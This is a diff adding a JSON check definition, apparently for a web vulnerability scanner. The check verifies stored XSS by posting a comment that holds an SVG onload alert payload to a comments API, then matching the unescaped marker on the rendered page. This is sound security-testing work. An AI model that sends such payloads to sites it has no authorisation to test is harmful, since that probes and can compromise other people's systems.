@@ -1,0 +1,39 @@
+{
+  "name": "web/Stored XSS persisted marker",
+  "description": "[mid] Stored XSS proven across requests (CWE-79; PortSwigger stored XSS): the payload POST persists an unescaped marker that a later GET of the page returns verbatim — persistence, not just reflection. Keywords: stored xss persistent comments injection svg onload. ctrl: sanitized storage never re-serves the raw marker -> not falsified. base_url = site root (copy skill to match the storage + render endpoints).",
+  "cwe": "CWE-79",
+  "requests": {
+    "payload": {
+      "method": "POST",
+      "url": "{{base_url}}/api/comments",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"author\":\"x9f\",\"comment\":\"<svg onload=alert(1) id=StR9k4x>\"}"
+    },
+    "check": {
+      "method": "GET",
+      "url": "{{base_url}}/comments"
+    }
+  },
+  "conditions": [
+    {
+      "type": "status",
+      "request": "payload",
+      "equals": 200
+    },
+    {
+      "type": "body_regex",
+      "request": "check",
+      "pattern": "<svg onload=alert\\(1\\) id=StR9k4x"
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "6b1f9a950503",
+  "created": "2026-11-06T00:00:00+00:00",
+  "last_used": "2026-11-06T00:00:00+00:00"
+}
